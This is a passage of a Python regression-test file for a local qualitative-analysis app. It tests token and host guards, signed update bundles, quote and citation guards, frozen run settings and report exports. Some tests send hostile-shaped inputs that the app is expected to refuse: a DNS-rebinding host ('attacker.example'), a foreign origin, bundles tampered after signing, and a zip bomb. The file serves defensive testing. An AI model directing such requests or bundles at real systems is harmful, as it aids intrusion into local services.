# Copyright 2026 Ashita Aggarwal and Suraj Commuri
# SPDX-License-Identifier: Apache-2.0

"""Regression tests for the 2026-09-02 audit fixes: the local API guard,
signed bundles, evidence integrity (unlocated marking, tolerant location,
segment windows, citation and quote guards), the frozen run configuration,
the report's configuration and audit sections, the audit export, method
fixes (thematic stage order, promoted-code charting, missing confidence,
content-analysis sampling and rates, chunked grouping), ingestion decoding,
and the packaging freshness check. Mocked model; scratch database."""

import io
import json
import os
import pathlib
import subprocess
import sys
import zipfile

import pytest
from starlette.testclient import TestClient

import app.db as db
import app.llm as llm
import app.pipeline as pipeline
from app import ingestion, signing, update
from app.main import app, SESSION_TOKEN
from app.methods import common
from app.methods.base import (RunContext, apply_code_review_resolution,
                              locate_quote, segment_text)
from app.methods.literature_synthesis import _citation_guard, reference_cut

AUTH = {"X-QualiLens-Token": SESSION_TOKEN}
client = TestClient(app, base_url="http://127.0.0.1", headers=AUTH)
# a client that behaves like another web page: local host, no token
stranger = TestClient(app, base_url="http://127.0.0.1")

DOC_A = "We chose the vendor because the price was transparent. Support was responsive."
DOC_B = "The onboarding was slow at first. The transparent pricing convinced finance."


def _mini(method="thematic", text=DOC_A, config=None):
    conn = db.get_conn()
    pid, rid, sid = db.new_id(), db.new_id(), db.new_id()
    cfg = {"provider": "anthropic", "model": "m", "research_question": "q"}
    cfg.update(config or {})
    conn.execute("INSERT INTO projects(id,name,method,config,created_at) VALUES(?,?,?,?,?)",
                 (pid, "Mini", method, json.dumps(cfg), db.now()))
    conn.execute("INSERT INTO sources(id,project_id,filename,kind,status,text,meta,created_at) "
                 "VALUES(?,?,?,?,?,?,?,?)",
                 (sid, pid, "s.txt", "text", "ready", text, "{}", db.now()))
    conn.execute("INSERT INTO runs(id,project_id,status,state,created_at,updated_at) "
                 "VALUES(?,?,?,?,?,?)",
                 (rid, pid, "running", json.dumps({"source_ids": [sid], "config": cfg}),
                  db.now(), db.now()))
    conn.commit()
    project = db.row_to_dict(conn.execute("SELECT * FROM projects WHERE id=?", (pid,)).fetchone(), ("config",))
    sources = [db.row_to_dict(conn.execute("SELECT * FROM sources WHERE id=?", (sid,)).fetchone(), ("meta",))]
    ctx = RunContext(rid, project, sources, cfg, "anthropic", "m", "k")
    ctx.state = {"source_ids": [sid], "config": cfg}
    return ctx, sid


def _quiesce():
    conn = db.get_conn()
    conn.execute("UPDATE runs SET status='cancelled' WHERE status IN ('running','awaiting_review')")
    conn.commit()


# ====================================================================
# A1–A3: the local-only guard
# ====================================================================

def test_api_requires_session_token():
    r = stranger.get("/api/meta")
    assert r.status_code == 401 and "session token" in r.json()["detail"]
    r = stranger.get("/api/projects")
    assert r.status_code == 401
    # body-less POSTs (the shape a cross-site fetch can send) are refused too
    r = stranger.post("/api/settings/install_update")
    assert r.status_code == 401
    r = stranger.post("/api/settings/check_updates")
    assert r.status_code == 401
    # with the token the same requests work
    assert client.get("/api/meta").status_code == 200


def test_wrong_token_and_wrong_host_refused():
    r = client.get("/api/meta", headers={"X-QualiLens-Token": "not-the-token"})
    assert r.status_code == 401
    other = TestClient(app, base_url="http://192.168.1.20:8765", headers=AUTH)
    assert other.get("/api/meta").status_code == 421
    evil = TestClient(app, base_url="http://attacker.example", headers=AUTH)
    assert evil.get("/api/meta").status_code == 421       # DNS rebinding shape
    assert evil.get("/").status_code == 421               # even the page itself
    # the IPv6 loopback and localhost are local too (TestClient cannot take an
    # IPv6 base_url, so the Host header is set by hand)
    assert client.get("/api/meta", headers={"host": "[::1]:8765"}).status_code == 200
    assert client.get("/api/meta", headers={"host": "localhost:8765"}).status_code == 200
    assert client.get("/api/meta", headers={"host": "localhost"}).status_code == 200
    assert client.get("/api/meta", headers={"host": "127.0.0.1.evil.example"}).status_code == 421
    assert client.get("/api/meta", headers={"host": ""}).status_code == 421


def test_foreign_origin_refused_even_with_token():
    r = client.get("/api/meta", headers={"Origin": "https://evil.example"})
    assert r.status_code == 403
    r = client.post("/api/settings/check_updates", headers={"Origin": "null"})
    assert r.status_code == 403
    r = client.get("/api/meta", headers={"Host": "127.0.0.1:8765", "Origin": "http://127.0.0.1:8765"})
    assert r.status_code == 200


def test_multipart_upload_from_stranger_refused():
    r = client.post('/api/projects', json={"name": "G", "method": "thematic",
                                           "config": {"provider": "anthropic", "research_question": "q"}})
    pid = r.json()["id"]
    r = stranger.post(f"/api/projects/{pid}/sources",
                      files={"file": ("planted.txt", io.BytesIO(b"planted"), "text/plain")},
                      data={"grp": ""})
    assert r.status_code == 401
    # the update endpoint — the critical one — is refused without the token
    r = stranger.post("/api/settings/update",
                      files={"file": ("QualiLens.zip", io.BytesIO(b"PK"), "application/zip")})
    assert r.status_code == 401


def test_index_carries_token_and_cookie_authenticates_downloads(tmp_path, monkeypatch):
    from app import main as main_mod
    if not main_mod.FRONTEND_DIST.exists():
        pytest.skip("no built frontend beside the backend")
    r = stranger.get("/")
    assert r.status_code == 200
    assert f'<meta name="ql-token" content="{SESSION_TOKEN}">' in r.text
    assert r.headers.get("cache-control") == "no-store"
    assert main_mod.TOKEN_COOKIE in r.cookies
    # the cookie alone (a plain <a href> download) authenticates
    cookie_only = TestClient(app, base_url="http://127.0.0.1")
    cookie_only.cookies.set(main_mod.TOKEN_COOKIE, SESSION_TOKEN)
    assert cookie_only.get("/api/meta").status_code == 200


def test_update_refused_while_a_run_is_live(mock_llm_ca):
    pid, run_id = mock_llm_ca
    d = _wait(run_id, "awaiting_review")
    r = client.post('/api/settings/install_update')
    assert r.status_code == 409 and "awaiting review" in r.json()["detail"]
    client.post(f'/api/runs/{run_id}/checkpoints/{d["pending_checkpoint"]["id"]}/resolve',
                json={"decisions": []})
    _wait(run_id, "completed")


# ====================================================================
# A2: signed bundles
# ====================================================================

def test_unsigned_tampered_and_foreign_key_bundles_refused(tmp_path, monkeypatch):
    from tests.test_fixes import _make_bundle, _fake_app_root
    _fake_app_root(tmp_path, monkeypatch)
    with pytest.raises(update.UpdateError, match="not signed"):
        update.apply_update(_make_bundle(tmp_path, sign=False))
    with pytest.raises(update.UpdateError, match="does not match its signed hash"):
        update.apply_update(_make_bundle(tmp_path, tamper_after_sign={
            "QualiLens/backend/app/main.py": "# evil\n"}))
    with pytest.raises(update.UpdateError, match="not covered by its signature"):
        update.apply_update(_make_bundle(tmp_path, tamper_after_sign={
            "QualiLens/backend/app/extra.py": "# planted\n"}))
    with pytest.raises(update.UpdateError, match="does not verify"):
        update.apply_update(_make_bundle(tmp_path, seed=bytes(range(1, 33))))
    with pytest.raises(update.UpdateError, match="does not verify"):
        update.apply_update(_make_bundle(tmp_path, tamper_after_sign={
            "QualiLens/MANIFEST.sig": "AAAA\n"}))
    # and a correctly signed bundle installs
    r = update.apply_update(_make_bundle(tmp_path))
    assert r["ok"] and r["signature"] == "verified"


def test_signing_roundtrip_and_cli(tmp_path):
    key = tmp_path / "k.key"
    pub = signing.keygen(key)
    assert len(bytes.fromhex(pub)) == 32
    stage = tmp_path / "stage"
    (stage / "backend").mkdir(parents=True)
    (stage / "backend" / "a.py").write_text("print(1)\n")
    (stage / "VERSION").write_text("1")
    signing.sign_stage(stage, key)
    assert (stage / "MANIFEST.sha256").exists() and (stage / "MANIFEST.sig").exists()
    zp = tmp_path / "b.zip"
    with zipfile.ZipFile(zp, "w") as z:
        for p in stage.rglob("*"):
            if p.is_file():
                z.write(p, "QualiLens/" + p.relative_to(stage).as_posix())
    assert signing.verify_bundle_file(zp, pub) == 2
    with pytest.raises(signing.SignatureError):
        signing.verify_bundle_file(zp, "00" * 32)
    # CLI
    out = subprocess.run([sys.executable, str(pathlib.Path("app/signing.py")), "verify", str(zp), pub],
                         capture_output=True, text=True, cwd=pathlib.Path(__file__).resolve().parent.parent)
    assert out.returncode == 0 and "verified" in out.stdout


def test_zip_bomb_shapes_refused(tmp_path, monkeypatch):
    from tests.test_fixes import _fake_app_root
    _fake_app_root(tmp_path, monkeypatch)
    zp = tmp_path / "bomb.zip"
    with zipfile.ZipFile(zp, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("QualiLens/NOTICE", "Copyright 2026 Ashita Aggarwal and Suraj Commuri")
        z.writestr("QualiLens/big.bin", b"\0" * (update.MAX_UNPACKED_BYTES + 1))
    with pytest.raises(update.UpdateError, match="implausible size"):
        update.apply_update(zp)


def test_models_json_preserved_on_update(tmp_path, monkeypatch):
    from tests.test_fixes import _make_bundle, _fake_app_root
    root = _fake_app_root(tmp_path, monkeypatch)
    (root / "backend" / "app" / "models.json").write_text('{"edited": true}')
    monkeypatch.setattr(db, "DATA_DIR", root / "backend" / "data")
    r = update.apply_update(_make_bundle(tmp_path, extra={
        "QualiLens/backend/app/models.json": '{"shipped": true}'}))
    assert "models.json.previous" in r.get("note", "")
    assert (root / "backend" / "data" / "models.json.previous").read_text() == '{"edited": true}'


# ====================================================================
# B1/B2/B13: evidence integrity
# ====================================================================

def test_locate_quote_tolerates_case_hyphenation_ligatures_and_uses_window():
    text = ("The persistent search for the\ncore of IS rests partly on a counter-\nintuitive premise. "
            "I don't know. Later she said: I don't know, and meant it. The ﬁnal ﬂow; a hy­phen.")
    s, e = locate_quote(text, "search for the core of IS")
    assert text[s:e] == "search for the\ncore of IS"
    s, e = locate_quote(text, "a counterintuitive premise")
    assert text[s:e] == "a counter-\nintuitive premise"
    s, e = locate_quote(text, "THE PERSISTENT SEARCH")
    assert (s, e) == (0, 21)
    s, e = locate_quote(text, "the final flow")
    assert text[s:e] == "The ﬁnal ﬂow"
    s, e = locate_quote(text, "a hyphen")
    assert text[s:e] == "a hy­phen"
    first = text.find("I don't know")
    second = text.find("I don't know", first + 1)
    assert locate_quote(text, "I don't know") == (first, first + 12)
    assert locate_quote(text, "I don't know", window=(second - 5, len(text))) == (second, second + 12)
    # a window that does not contain the quote still finds it elsewhere
    assert locate_quote(text, "counterintuitive", window=(0, 10))[0] is not None
    assert locate_quote(text, "utterly absent xyzzy") == (None, None)
    assert locate_quote("", "x") == (None, None) and locate_quote(text, "  ") == (None, None)


def test_segments_carry_offsets_and_coding_uses_them(monkeypatch):
    text = "Alpha. I don't know.\n\n" + ("filler sentence here. " * 400) + "\n\nOmega. I don't know."
    segs = segment_text(text, 3000)
    assert len(segs) > 1
    for i, seg, start in segs:
        assert text[start:start + len(seg)] == seg
    assert "".join(seg for _, seg, _ in segs) == text
    ctx, sid = _mini(text=text)
    monkeypatch.setattr(RunContext, "SEGMENT_CHARS", 3000)
    calls = []

    def fake(provider, model, api_key, system, user, max_tokens=8000, temperature=0.3):
        calls.append(user)
        # every segment returns the same recurring phrase
        return (json.dumps({"codes": [{"name": "not knowing", "definition": "d",
                                       "excerpts": [{"quote": "I don't know", "memo": ""}]}]}),
                {"input_tokens": 1, "output_tokens": 1, "stop_reason": "end_turn"})
    monkeypatch.setattr(llm, "chat", fake)
    common.run_coding_pass(ctx, "open_code", "SYS")
    starts = sorted(r["start_char"] for r in db.get_conn().execute(
        "SELECT start_char FROM excerpts WHERE run_id=?", (ctx.run_id,)).fetchall())
    assert len(starts) == len(segs)
    assert starts[0] == text.find("I don't know")
    assert starts[-1] == text.rfind("I don't know"), "the last segment's quote must locate in the last segment"


def test_unlocated_excerpt_marked_in_payload_and_docx():
    from app import report_docx
    import docx as _docx
    ctx, sid = _mini()
    c = ctx.add_code("a code", "", "theme")
    ctx.add_excerpt(c, sid, "the price was transparent")
    ctx.add_excerpt(c, sid, "a paraphrase that is not in the source")
    common.assemble_report(ctx, "T", [], "theme", None)
    payload = json.loads(db.get_conn().execute(
        "SELECT payload FROM reports WHERE run_id=?", (ctx.run_id,)).fetchone()["payload"])
    exs = payload["themes"][0]["excerpts"]
    assert [e["located"] for e in exs] == [True, False]
    assert payload["audit"]["excerpts_located"] == 1 and payload["audit"]["excerpts_unlocated"] == 1
    d = _docx.Document(io.BytesIO(report_docx.build_docx(payload)))
    text = "\n".join(p.text for p in d.paragraphs)
    assert "“the price was transparent”" in text
    assert "“a paraphrase that is not in the source”" not in text
    assert "[not located verbatim] a paraphrase that is not in the source" in text
    assert "Unverified (1)" in text
    assert "1 could not be located and are listed as unverified" in text


def test_citation_guard_scripts_years_and_filename_stopwords():
    labels = ["Okafor, 2021", "Латур, 2005", "Davis, 1989",
              "Grover, 2026 (The Changing Landscape of Behavioral IS Research.pdf)"]
    body = ("(Okafor, 2021) (Латур, 2005) (Davis, 1989) (Grover, 2026) (Grover et al., 2026) "
            "(Venkatesh & Davis, 2000) (Davis, 2003) (Smith, 2015, in the Journal of Research) "
            "(Jones, 1998) (Okafor, 2021; Smith, 1998)")
    flagged = _citation_guard([{"body": body}], labels)
    assert flagged == ["Venkatesh & Davis, 2000", "Davis, 2003",
                       "Smith, 2015, in the Journal of Research", "Jones, 1998", "Smith, 1998"]
    # a label without a year excuses any year for that surname
    assert _citation_guard([{"body": "(Okafor, 2019)"}], ["Okafor"]) == []
    # context before the parenthesis excuses the first citation only
    assert _citation_guard([{"body": "Okafor (2021) says; Smith (1998) says."}], ["Okafor, 2021"]) == ["1998"]


def test_reference_cut_and_extraction_skips_reference_list(monkeypatch):
    body = "Body paragraph about this study and what it found. " * 60
    text = body + "\n\nReferences\n\n" + "Smith, J. (1998). A paper. Journal.\n" * 20
    cut = reference_cut(text)
    assert text[cut:].startswith("References")
    assert reference_cut("References are discussed early.\n" * 50 + "End.") == len("References are discussed early.\n" * 50 + "End.")
    from app.methods import literature_synthesis as ls
    ctx, sid = _mini("literature_synthesis", text=text)
    seen = []

    def fake(provider, model, api_key, system, user, max_tokens=8000, temperature=0.3):
        seen.append(user)
        if "STRUCTURED EXTRACTION" in system:
            return (json.dumps({"citation": "", "cited_work": "Jones found X.", "fields": {
                "findings": {"notes": "n", "quotes": [{"quote": "this study and what it found", "why": "w"}]}}}),
                {"input_tokens": 1, "output_tokens": 1, "stop_reason": "end_turn"})
        return (json.dumps({"label": "A, 2020", "citation": "", "aims": "a", "method": "m",
                            "sample": "s", "findings": "f", "limitations": "l",
                            "cited_work": "Jones found X."}),
                {"input_tokens": 1, "output_tokens": 1, "stop_reason": "end_turn"})
    monkeypatch.setattr(llm, "chat", fake)
    ls.stage_extract(ctx)
    extract_prompts = [u for u in seen if "Paper:" in u and "part" in u]
    assert extract_prompts and all("Smith, J. (1998)" not in u for u in extract_prompts), \
        "the reference list must not be sent for extraction"
    assert ctx.state["extractions"][sid]["cited_work"] == "Jones found X."
    title, instr, payload = ls.cp_extraction_payload(ctx)
    assert payload["rows"][0]["cited_work"] == "Jones found X."


def test_quote_guard_flags_invented_quotations(monkeypatch):
    ctx, sid = _mini()
    c = ctx.add_code("code", "", "theme")
    ctx.add_excerpt(c, sid, "the price was transparent")
    sections = [{"heading": "Findings", "body": 'One said “the price was transparent”. '
                                                'Another said "we never trusted any vendor at all in our lives".'},
                {"heading": "Limitations of This Analysis", "body": "L."}]
    flagged = common.apply_quote_guard(ctx, sections, "Limitations of This Analysis")
    assert flagged == ["we never trusted any vendor at all in our lives"]
    assert "Quote guard" in sections[1]["body"]
    # short quotations are not judged; a quotation from the source text passes
    sections = [{"heading": "F", "body": '“Support was responsive” and "ok".'}]
    assert common.apply_quote_guard(ctx, sections, "Limitations of This Analysis") == []


# ====================================================================
# B10/B11/B12: frozen config, report sections, audit export
# ====================================================================

def _wait(run_id, *want, timeout=20):
    import time
    for _ in range(timeout * 20):
        d = client.get(f'/api/runs/{run_id}').json()
        if d["status"] in want:
            return d
        time.sleep(0.05)
    raise AssertionError(f"timeout waiting for {want}; last {d['status']} {d.get('error')}")


@pytest.fixture()
def mock_llm_ca(monkeypatch):
    from tests.test_fixes import MockLLM
    m = MockLLM()
    monkeypatch.setattr(llm, "chat", m)
    client.put('/api/settings/keys', json={"anthropic": "sk-test"})
    _quiesce()
    r = client.post('/api/projects', json={
        "name": "Frozen", "method": "content_analysis",
        "config": {"provider": "anthropic", "research_question": "original question",
                   "ca_mode": "Inductive — derive the codebook from the data"}})
    pid = r.json()["id"]
    client.post(f'/api/projects/{pid}/sources',
                files={"file": ("doc_1.txt", io.BytesIO(DOC_A.encode()), "text/plain")}, data={"grp": ""})
    run_id = client.post(f'/api/projects/{pid}/runs').json()["run_id"]
    return pid, run_id


def test_run_freezes_config_and_report_carries_it(mock_llm_ca):
    pid, run_id = mock_llm_ca
    d = _wait(run_id, "awaiting_review")
    # edit the project while the run waits: refused (active run) …
    r = client.put(f'/api/projects/{pid}', json={"name": "Frozen", "method": "content_analysis",
                                                  "config": {"provider": "anthropic", "research_question": "CHANGED",
                                                             "ca_mode": "Inductive — derive the codebook from the data"}})
    assert r.status_code == 409
    # … but even a direct edit of the project row cannot reach the run
    conn = db.get_conn()
    conn.execute("UPDATE projects SET config=? WHERE id=?",
                 (json.dumps({"provider": "anthropic", "model": "other-model", "research_question": "CHANGED",
                              "ca_mode": "Inductive — derive the codebook from the data"}), pid))
    conn.commit()
    ctx = pipeline._load_ctx(run_id)
    assert ctx.config["research_question"] == "original question"
    assert ctx.model == "claude-sonnet-5" or ctx.model == llm.catalog()["anthropic"]["default_model"]
    client.post(f'/api/runs/{run_id}/checkpoints/{d["pending_checkpoint"]["id"]}/resolve', json={"decisions": []})
    _wait(run_id, "completed")
    rep = client.get(f'/api/runs/{run_id}/report').json()
    assert rep["config"]["research_question"] == "original question"
    assert rep["method_label"] == "Content Analysis"
    assert rep["config_labels"]["research_question"] == "Research question"
    assert rep["audit"]["models_used"]
    assert rep["audit"]["checkpoints"][0]["summary"] == {}      # approved without changes
    assert rep["stats"]["unit"].startswith("coded passage")
    assert all("per_10k_chars" in row for row in rep["stats"]["rows"])
    # docx carries the configuration section
    import docx as _docx
    from app import report_docx
    d = _docx.Document(io.BytesIO(report_docx.build_docx(rep)))
    text = "\n".join(p.text for p in d.paragraphs)
    assert "Method Configuration" in text and "Research question: original question" in text
    assert "Method: Content Analysis" in text
    # audit export
    r = client.get(f'/api/runs/{run_id}/audit.json')
    assert r.status_code == 200 and "attachment" in r.headers["content-disposition"]
    doc = r.json()
    assert doc["config"]["research_question"] == "original question"
    assert any(e["kind"] == "user_decision" for e in doc["events"])
    assert doc["checkpoints"][0]["resolution"]["decisions"] == []
    assert doc["checkpoints"][0]["payload"]["kind"] == "code_review"


def test_sampling_settings_recorded_per_provider(monkeypatch):
    """The effective temperature/token budget differs by provider; every
    real call reports it so the audit log can carry it."""
    seen = {}
    real_post = llm._post_with_retry

    def fake_post(url, headers, payload, retries=5):
        seen["payload"] = payload
        if "anthropic" in url:
            return {"content": [{"text": "ok"}], "usage": {"input_tokens": 1, "output_tokens": 1}, "stop_reason": "end_turn"}
        if "openai" in url or "mistral" in url:
            return {"choices": [{"message": {"content": "ok"}, "finish_reason": "stop"}],
                    "usage": {"prompt_tokens": 1, "completion_tokens": 1}}
        return {"candidates": [{"content": {"parts": [{"text": "ok"}]}, "finishReason": "STOP"}],
                "usageMetadata": {"promptTokenCount": 1, "candidatesTokenCount": 1}}
    monkeypatch.setattr(llm, "_post_with_retry", fake_post)
    _, u = llm.chat("anthropic", "claude-x", "k", "s", "u", max_tokens=100, temperature=0.2)
    assert u["sampling"] == {"temperature": "provider default", "max_tokens": 8100}
    _, u = llm.chat("openai", "gpt-4.1", "k", "s", "u", max_tokens=100, temperature=0.2)
    assert u["sampling"] == {"temperature": 0.2, "max_tokens": 100}
    _, u = llm.chat("openai", "gpt-5.1", "k", "s", "u", max_tokens=100, temperature=0.2)
    assert u["sampling"]["temperature"] == "provider default"
    _, u = llm.chat("google", "gemini-x", "k", "s", "u", max_tokens=100, temperature=0.2)
    assert u["sampling"] == {"temperature": 0.2, "max_tokens": 100 + 16384}
    _, u = llm.chat("mistral", "m", "k", "s", "u", max_tokens=100, temperature=0.2)
    assert u["sampling"] == {"temperature": 0.2, "max_tokens": 100}
    # a 200 with a non-JSON body is an LLMError, not a stray exception
    class R:
        status_code = 200
        text = "<html>"
        headers = {}
        def json(self): raise ValueError("no")
    class C:
        def __init__(self, timeout=None): pass
        def __enter__(self): return self
        def __exit__(self, *a): return False
        def post(self, *a, **k): return R()
    monkeypatch.setattr(llm.httpx, "Client", C)
    with pytest.raises(llm.LLMError, match="not JSON"):
        real_post("https://api.openai.com/x", {}, {}, retries=0)


def test_resolution_summary_names_decisions():
    ctx, sid = _mini()
    a = ctx.add_code("a", "", "open_code"); b = ctx.add_code("b", "", "open_code")
    apply_code_review_resolution(ctx, {"decisions": [
        {"id": a, "action": "rename", "name": "renamed a"},
        {"id": b, "action": "delete"}], "additions": [{"name": "new one"}], "stage": "open_code"})
    summ = common._resolution_summary(json.dumps({"decisions": [
        {"id": a, "action": "rename", "name": "renamed a"}, {"id": b, "action": "delete"}],
        "additions": [{"name": "new one"}]}))
    assert summ["decisions"] == {"rename": 1, "delete": 1}
    assert summ["renamed_to"] == ["renamed a"] and summ["added"] == ["new one"]


# ====================================================================
# B22: resolutions scoped to the run and validated
# ====================================================================

def test_resolution_refuses_foreign_and_invalid_targets():
    ctxA, sidA = _mini(); ctxB, sidB = _mini()
    codeB = ctxB.add_code("code in B", "", "open_code")
    codeA = ctxA.add_code("code in A", "", "open_code")
    themeA = ctxA.add_code("theme in A", "", "theme")
    with pytest.raises(ValueError, match="not part of this run"):
        apply_code_review_resolution(ctxA, {"decisions": [{"id": codeB, "action": "rename", "name": "X"}],
                                            "stage": "open_code"})
    with pytest.raises(ValueError, match="not a code of this run"):
        apply_code_review_resolution(ctxA, {"decisions": [{"id": codeA, "action": "merge", "merge_into": codeB}],
                                            "stage": "open_code"})
    with pytest.raises(ValueError, match="different kinds"):
        apply_code_review_resolution(ctxA, {"decisions": [{"id": codeA, "action": "merge", "merge_into": themeA}],
                                            "stage": "open_code"})
    with pytest.raises(ValueError, match="does not belong"):
        apply_code_review_resolution(ctxA, {"decisions": [{"id": themeA, "action": "delete"}],
                                            "stage": "open_code"})
    # nothing was mutated by the refused batches
    assert db.get_conn().execute("SELECT name FROM codes WHERE id=?", (codeB,)).fetchone()["name"] == "code in B"
    # an inactive target from an earlier review is refused
    other = ctxA.add_code("other", "", "open_code")
    apply_code_review_resolution(ctxA, {"decisions": [{"id": other, "action": "delete"}], "stage": "open_code"})
    with pytest.raises(ValueError, match="no longer active"):
        apply_code_review_resolution(ctxA, {"decisions": [{"id": codeA, "action": "merge", "merge_into": other}],
                                            "stage": "open_code"})


# ====================================================================
# B7/B8/B9/B14/B23: method fixes
# ====================================================================

def test_thematic_defines_names_before_the_review():
    from app.methods import thematic
    names = [s.name for s in thematic.METHOD.stages]
    assert names.index("define_name") < names.index("review_themes")
    assert names[-1] == "report"


def test_define_name_keeps_candidate_and_respects_edits(monkeypatch):
    from app.methods import thematic
    ctx, sid = _mini()
    t1 = ctx.add_code("candidate one", "old def", "theme")
    t2 = ctx.add_code("locked", "mine", "theme")
    apply_code_review_resolution(ctx, {"decisions": [{"id": t2, "action": "rename", "name": "locked"}], "stage": "theme"})

    def fake(provider, model, api_key, system, user, max_tokens=8000, temperature=0.3):
        return (json.dumps({"themes": [{"theme_id": t1, "final_name": "Final One", "final_definition": "new def"},
                                       {"theme_id": t2, "final_name": "SHOULD NOT APPLY", "final_definition": "x"}]}),
                {"input_tokens": 1, "output_tokens": 1, "stop_reason": "end_turn"})
    monkeypatch.setattr(llm, "chat", fake)
    thematic.stage_define_name(ctx)
    rows = {r["id"]: db.row_to_dict(r, ("meta",)) for r in db.get_conn().execute(
        "SELECT * FROM codes WHERE run_id=?", (ctx.run_id,)).fetchall()}
    assert rows[t1]["name"] == "Final One" and rows[t1]["meta"]["candidate_name"] == "candidate one"
    assert rows[t2]["name"] == "locked"
    title, instr, payload = thematic.cp_theme_payload(ctx)
    item = next(i for i in payload["items"] if i["id"] == t1)
    assert item["candidate_name"] == "candidate one"


def test_missing_confidence_is_null_and_reviewable(monkeypatch):
    from app.methods import framework
    ctx, sid = _mini("framework", config={"codebook_text": "Pricing: price talk\nSupport: support talk"})
    framework.stage_load_framework(ctx)

    def fake(provider, model, api_key, system, user, max_tokens=8000, temperature=0.3):
        return (json.dumps({"assignments": [
            {"code": "Pricing", "quote": "the price was transparent"},               # no confidence
            {"code": "Support", "quote": "Support was responsive", "confidence": 0.95},
            {"code": "Nonexistent", "quote": "Support was responsive", "confidence": 0.9}],
            "emergent": []}),
            {"input_tokens": 1, "output_tokens": 1, "stop_reason": "end_turn"})
    monkeypatch.setattr(llm, "chat", fake)
    framework.stage_apply(ctx)
    confs = [r["confidence"] for r in db.get_conn().execute(
        "SELECT confidence FROM excerpts WHERE run_id=? ORDER BY created_at", (ctx.run_id,)).fetchall()]
    assert confs == [None, 0.95]
    title, instr, payload = framework.cp_review_payload(ctx)
    assert payload["low_confidence_total"] == 1 and payload["low_confidence"][0]["confidence"] is None
    dropped = db.get_conn().execute("SELECT COUNT(*) c FROM events WHERE run_id=? AND message LIKE 'Dropped assignment%'",
                                    (ctx.run_id,)).fetchone()["c"]
    assert dropped == 1, "framework must log dropped assignments like content analysis does"


def test_promoted_emergent_code_is_charted_across_corpus(monkeypatch):
    from app.methods import framework
    ctx, sid = _mini("framework", text=DOC_A + " " + DOC_B,
                     config={"codebook_text": "Pricing: price talk", "allow_emergent": "true"})
    framework.stage_load_framework(ctx)
    phase = {"n": 0}

    def fake(provider, model, api_key, system, user, max_tokens=8000, temperature=0.3):
        if "only these codes" in user:      # the re-chart pass
            phase["n"] += 1
            return (json.dumps({"assignments": [
                {"code": "Onboarding", "quote": "The onboarding was slow at first", "confidence": 0.7, "memo": "m"},
                {"code": "Onboarding", "quote": "Support was responsive", "confidence": 0.6, "memo": "already there"}]}),
                {"input_tokens": 1, "output_tokens": 1, "stop_reason": "end_turn"})
        return (json.dumps({"assignments": [{"code": "Pricing", "quote": "the price was transparent", "confidence": 0.9, "memo": "m"}],
                            "emergent": [{"proposed_code": "Onboarding", "definition": "d", "quote": "Support was responsive"}]}),
                {"input_tokens": 1, "output_tokens": 1, "stop_reason": "end_turn"})
    monkeypatch.setattr(llm, "chat", fake)
    framework.stage_apply(ctx)
    title, instr, payload = framework.cp_review_payload(ctx)
    em = payload["items"][0]
    framework.cp_review_apply(ctx, {"decisions": [{"id": em["id"], "action": "keep"}], "excerpt_deletions": []})
    assert ctx.state["promoted_codes"] == [em["id"]]
    framework.stage_chart_promoted(ctx)
    assert phase["n"] == 1
    quotes = sorted(r["quote"] for r in db.get_conn().execute(
        "SELECT quote FROM excerpts WHERE run_id=? AND code_id=?", (ctx.run_id, em["id"])).fetchall())
    assert quotes == ["Support was responsive", "The onboarding was slow at first"], \
        "the promoted code gains the new passage and does not duplicate the one it already had"
    # resumable and idempotent
    framework.stage_chart_promoted(ctx)
    assert phase["n"] == 1


def test_group_codes_chunks_and_consolidates(monkeypatch):
    ctx, sid = _mini()
    ids = [ctx.add_code(f"code {i}", "d", "open_code") for i in range(common.GROUP_CHUNK * 2 + 5)]
    calls = []

    def fake(provider, model, api_key, system, user, max_tokens=8000, temperature=0.3):
        calls.append(user)
        import re as _re
        if "Provisional themes" in user:
            gids = _re.findall(r"\[(g\d+)\]", user)
            half = len(gids) // 2
            return (json.dumps({"themes": [
                {"name": "Final A", "definition": "d", "rationale": "r", "group_ids": gids[:half]},
                {"name": "Final B", "definition": "d", "rationale": "r", "group_ids": gids[half:]}]}),
                {"input_tokens": 1, "output_tokens": 1, "stop_reason": "end_turn"})
        cids = _re.findall(r"\[([0-9a-f]{12})\]", user)
        return (json.dumps({"themes": [{"name": f"chunk group {len(calls)}", "definition": "d",
                                        "rationale": "r", "code_ids": cids}]}),
                {"input_tokens": 1, "output_tokens": 1, "stop_reason": "end_turn"})
    monkeypatch.setattr(llm, "chat", fake)
    common.group_codes(ctx, "open_code", "theme", "SYS", "theme", "themes")
    themes = ctx.codes(stage="theme")
    assert sorted(t["name"] for t in themes) == ["Final A", "Final B"]
    assert len(calls) == 4          # 3 chunks + 1 consolidation
    parents = {r["parent_id"] for r in db.get_conn().execute(
        "SELECT parent_id FROM codes WHERE run_id=? AND stage='open_code'", (ctx.run_id,)).fetchall()}
    assert None not in parents and parents <= {t["id"] for t in themes}


def test_core_review_logs_only_real_changes():
    from app.methods import grounded_theory as gt
    ctx, sid = _mini("grounded_theory")
    core = ctx.add_code("Core", "def", "core", meta={"storyline": "story"})
    gt.cp_core_apply(ctx, {"decisions": [{"id": core, "name": "Core", "definition": "def", "storyline": "story"}]})
    gt.cp_core_apply(ctx, {"decisions": [{"id": core, "name": "Core", "definition": "def", "storyline": "NEW"}]})
    msgs = [r["message"] for r in db.get_conn().execute(
        "SELECT message FROM events WHERE run_id=? AND kind='user_decision' ORDER BY ts", (ctx.run_id,)).fetchall()]
    assert msgs == ["Researcher approved the core category unchanged",
                    "Researcher edited the core category (storyline)"]


def test_content_analysis_samples_head_middle_tail_and_rates():
    from app.methods import content_analysis as ca
    text = "HEAD " * 200 + "MIDDLE " * 200 + "TAIL " * 200
    sample = ca.sample_source(text, 300)
    assert "HEAD" in sample and "MIDDLE" in sample and "TAIL" in sample and "[…]" in sample
    assert ca.sample_source("short", 300) == "short"
    ctx, sid = _mini("content_analysis", config={"ca_compare_groups": "true"})
    ctx.sources[0]["grp"] = "G1"
    c = ctx.add_code("Pricing", "", "codebook")
    ctx.add_excerpt(c, sid, "the price was transparent")
    stats = ca.compute_stats(ctx)
    row = stats["rows"][0]
    assert row["per_10k_chars"] == round(1 / len(DOC_A) * 10000, 2)
    assert row["by_group_per_10k"]["G1"] == row["per_10k_chars"]
    assert stats["unit"].startswith("coded passage") and stats["group_chars"]["G1"] == len(DOC_A)


def test_familiarization_logs_the_cap(monkeypatch):
    ctx, sid = _mini(text="x" * (common.FAMILIARIZE_CHARS + 10))

    def fake(provider, model, api_key, system, user, max_tokens=8000, temperature=0.3):
